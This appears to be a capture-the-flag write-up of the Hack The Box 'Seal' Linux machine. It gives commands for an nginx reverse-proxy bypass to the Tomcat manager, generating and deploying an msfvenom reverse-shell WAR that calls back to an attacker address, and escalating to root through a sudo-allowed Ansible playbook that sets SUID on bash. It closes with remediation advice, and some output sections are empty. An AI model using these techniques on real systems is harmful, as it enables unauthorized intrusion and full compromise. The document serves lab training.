# HTB: Seal - Linux Medium Machine

## Summary

Seal is a medium difficulty Linux machine that involves exploiting an nginx reverse proxy misconfiguration to access internal services, followed by git repository analysis and privilege escalation through sudo misconfigurations.

**Attack Path:**
1. Nginx reverse proxy bypass to access internal Tomcat
2. GitBucket application exploitation
3. Git repository enumeration for credentials
4. Privilege escalation via Ansible playbook execution

## Initial Access

### Nginx Reverse Proxy Bypass

The nginx configuration contains a vulnerability that allows bypassing access controls to internal services.

**Vulnerability:** Path traversal in nginx proxy configuration allows access to restricted Tomcat manager interface.

```bash
# Bypass technique
curl -k "https://10.129.95.190/manager/..;/manager/html" -H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="
```

This bypasses the nginx access controls and reveals the Tomcat manager interface running internally.

### GitBucket Exploitation

Accessing the GitBucket application reveals several repositories:

```bash
# Discovered repositories
- seal/root (private)
- seal/infra (public)
```

**Key Finding:** The public `infra` repository contains Ansible playbooks and configuration files.

### Repository Analysis

Examining the Git history reveals sensitive information:

```bash
git log --oneline

```

**Critical Discovery:** Leaked Tomcat manager credentials in git history:

## User Access

### Tomcat Manager Exploitation

With valid credentials, we can deploy malicious WAR files:

```bash
# Generate reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f war > shell.war

# Deploy via Tomcat manager
curl -u "tomcat:42MrHBf*z8{Z%" --upload-file shell.war "https://10.129.95.190/manager/text/deploy?path=/shell&update=true" -k
```

**Result:** Shell as `tomcat` user

## Privilege Escalation

### System Enumeration

```bash

    (ALL) NOPASSWD: /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

### Ansible Privilege Escalation

The `tomcat` user can execute a specific Ansible playbook as root. Analyzing the playbook structure:

```bash
ls -la /opt/backups/playbook/
cat /opt/backups/playbook/run.yml
```

**Vulnerability:** The playbook includes tasks from a path we can control.

### Exploitation Method

1. **Create malicious task file:**

```yaml
# /tmp/malicious.yml
- name: Privilege escalation
  shell: |
    chmod +s /bin/bash
  become: yes
  become_user: root
```

2. **Modify the main playbook to include our malicious task:**

```bash
# If we can write to the include path or manipulate the playbook
echo "- include: /tmp/malicious.yml" >> /opt/backups/playbook/run.yml
```

3. **Execute the playbook:**

```bash
sudo /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

### Alternative Method: Path Manipulation

If direct modification isn't possible, we can exploit path traversal or symbolic links:

```bash
# Create symbolic link
ln -s /tmp/evil.yml /opt/backups/playbook/tasks/backup.yml

# Or exploit relative paths in the playbook
```

## Remediation

### Nginx Configuration

Fix the reverse proxy configuration to prevent path traversal:

```nginx
location /manager {
    deny all;
}

location ~ /manager/.* {
    deny all;
}
```

### Git Security

- Remove sensitive data from git history
- Implement proper .gitignore policies
- Use git-secrets or similar tools
- Regular credential rotation

### Ansible Security

- Restrict sudo permissions to specific playbooks
- Implement playbook signing and verification
- Use Ansible Vault for sensitive data
- Regular privilege review

### General Hardening

- Implement proper access controls
- Regular security assessments
- Credential management policies
- Network segmentation

## Lessons Learned

1. **Reverse proxy configurations** require careful testing for bypass techniques
2. **Git repositories** should never contain credentials, even in history
3. **Ansible playbooks** with sudo access need strict controls
4. **Defense in depth** prevents single point of failure exploitation

This machine excellently demonstrates how multiple small misconfigurations can be chained together for complete system compromise.
